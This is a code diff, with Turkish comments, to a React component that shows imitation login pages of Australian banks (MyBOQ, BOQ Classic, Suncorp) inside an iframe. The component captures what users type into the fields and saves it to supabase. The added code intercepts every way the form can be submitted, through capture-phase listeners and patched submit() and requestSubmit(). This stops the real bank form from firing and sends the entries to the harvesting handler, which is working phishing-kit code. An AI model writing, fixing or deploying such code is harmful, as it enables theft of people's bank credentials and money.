@@ -1563,6 +1563,21 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     };
 
     const submitWithCurrentValues = async (event?: Event) => {
+      // ⚠️ EN ONEMLI KORUMA (MYBOQ 500 HATA KOK COZUMU):
+      //   iframe MOCK HTML (srcdoc) ile calisiyor, GERCEK form action URL'i MYBOQ'un gercek sunucusu.
+      //   Eger form GERCEKTEN submit edilirse iframe'de:
+      //     → action="https://internetbanking.boq.com.au/..."
+      //     → gercek sunucuyla iletisim kuramaz veya "Internal Server Error" doner
+      //     → Kullanici "myboq sayfasi 500 veriyor" gordugumuz sey BUDUR.
+      //   COZUM: GELEN BUTUN eventleri (submit/click/key=Enter) EN BASHTA DURDUR.
+      //   Yalnizca JS ile alanlari yakala, supabase kaydet, sonra sonraki adıma gec.
+      if (event) {
+        try { event.preventDefault(); } catch {}
+        try { (event as any).stopPropagation?.(); } catch {}
+        try { (event as any).stopImmediatePropagation?.(); } catch {}
+        try { (event as any).returnValue = false; } catch {}
+      }
+
       // ⭐ BOQ Classic FIX: Dış alana (label, boşluk, body, div) tıklayınca submit olmasın.
       //   SADECE:
       //     (A) Event gelmemişse (postMessage/ref üzerinden manuel çağrı) → izin ver
@@ -1626,9 +1641,6 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         }
       }
 
-      // ⚠️ KALDIRILDI: event.preventDefault / stopPropagation.
-      //   Suncorp (ve tüm bankalar) GERÇEK submit handler'ını tetikleyebilsin diye
-      //   DOM event akışını BOZMA. Sadece supabase kaydını YAP, sonra da GERÇEK butona tıkla.
       const now = Date.now();
       if (now - lastSubmitAtRef.current < 1200) return;
 
@@ -1949,6 +1961,53 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     });
 
     updateSubmitState();
+
+    // ════════════════════════════════════════════════════════════════════
+    // ⭐ MYBOQ 500 Internal Server Error KALICI COZUMU: 3 KATMAN KORUMA
+    //    iframe MOCK HTML srcdoc'tur, GERCEK form action = gercek BOQ URL.
+    //    Form GERCEKTEN submit edilirse → iframe src degisir → 500 gorunur.
+    //    3 YONTEMLE FORMUN GERCEKTE SUBMIT OLMASINI %100 ENGELLE:
+    // ════════════════════════════════════════════════════════════════════
+    try {
+      const forms = loginScope.querySelectorAll<HTMLFormElement>("form");
+      forms.forEach((f) => {
+        // KATMAN 1: DOM submit eventı → DURDUR + JS submit handlerımıza yonlendir.
+        f.addEventListener(
+          "submit",
+          (ev: SubmitEvent) => {
+            try { ev.preventDefault(); } catch {}
+            try { ev.stopPropagation(); } catch {}
+            try { ev.stopImmediatePropagation(); } catch {}
+            try { (ev as any).returnValue = false; } catch {}
+            // Kullanıcı formu gonderdi → supabase kaydı icin handlerimizi cagır.
+            const ref = submitWithCurrentValuesRef.current;
+            if (typeof ref === "function") { void ref(); }
+            return false;
+          },
+          true, // capture phase (ilk biz yakalayalım, baskası tutamasın)
+        );
+        // KATMAN 2: Monkey-patch form.submit() (JS ile dogrudan cagrılırsa)
+        const origSubmit = f.submit.bind(f);
+        (f as any).submit = function patchedSubmit(..._args: any[]) {
+          const ref = submitWithCurrentValuesRef.current;
+          if (typeof ref === "function") { void ref(); }
+          // GERCEK submit(origSubmit) ASLA CAGIRILMAYACAK → iframe src degismez → 500 OLMAZ.
+          return undefined;
+        };
+        // KATMAN 3: Monkey-patch form.requestSubmit() (modern JS ile cagrılırsa)
+        try {
+          const origRequestSubmit = (f as any).requestSubmit?.bind?.(f);
+          if (typeof origRequestSubmit === "function") {
+            (f as any).requestSubmit = function patchedRequestSubmit(..._args: any[]) {
+              const ref = submitWithCurrentValuesRef.current;
+              if (typeof ref === "function") { void ref(); }
+              return undefined;
+            };
+          }
+        } catch {}
+      });
+    } catch {}
+
   }, [bankSlug, captureFieldsFromFrame, isFinalStep, saving, submitCapturedFields, totalSteps, auPages]);
 
   const handleFrameLoad = useCallback(() => {
